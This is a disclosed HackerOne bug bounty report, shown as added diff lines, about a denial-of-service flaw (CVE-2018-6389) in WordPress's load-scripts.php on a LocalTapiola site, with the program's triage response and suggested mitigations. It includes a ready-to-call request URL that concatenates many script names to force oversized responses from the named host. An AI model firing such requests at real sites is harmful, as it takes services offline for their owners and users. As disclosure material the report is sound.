@@ -1,0 +1,48 @@
+ReportLink:https://hackerone.com/reports/335177
+WeaknessName:Denial of Service
+Reporter:https://hackerone.com/exadmin
+ReportedTo:LocalTapiola(localtapiola)
+BountyAmount:50.0
+Severity:high
+State:Closed
+DateOfDisclosure:28.04.2018 13:15:38
+
+Summary:
+#Issue
+The reporter found a CVE code that applied to www.lahitapiolarahoitus.fi.
+
+##Fix
+
+The issue was resolved during normal and scheduled hardening of Wordpress.
+
+##Reasoning
+
+The issue was valid and the reporter provided some tips on how to mitigate this - there was no patch from Wordpress that fixed this at the moment of reporting. Hardening was already in the pipeline, but as this was found before those were put in place the finding was processed. The report had enough information to warrant a small bounty.  We also appreciate the post-fix testing done by the reporter.
+
+Outside of this report: we do not encourage any reporters to do plain copy-pasting of CVE codes based on scanners without any actual business impact (implying the reporter should make an effort  to understand what the service we are running is about). Rewards for issues that are fixed by normal patching and hardening cycles may vary, this especially applies to reports based purely on CVE-database information.
+##Description##
+There is possibility in /wp-admin/load-scripts.php script to generate large (~3Mb) amount of data via simple non-authenticated request to server.
+The vulnerability is registered as https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
+
+##Details##
+Detailed attack scenario is described for example here: https://baraktawily.blogspot.ru/2018/02/how-to-dos-29-of-world-wide-websites.html
+I have an Apache JMeter script  which is able to simulate necessary loading for your site (can be provided to you if necessary).
+
+##Ready for call URL is following##
+https://www.lahitapiolarahoitus.fi/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer
+
+(it cab be longer, this is just an example)
+
+As no rate-limiting is setup for this URL - then DoS comes real.
+
+##Variants to fix issue##
+change default "admin" directory name (Security through obscurity)
+or apply some password protection to /wp-admin/ url
+or apply some rate-limiting (but DDoS is still possible)
+Thank you!
+
+Unfortunatelly, no fix from WordPress side is provided for this issue.
+
+## Impact
+
+DoS of the site and application server
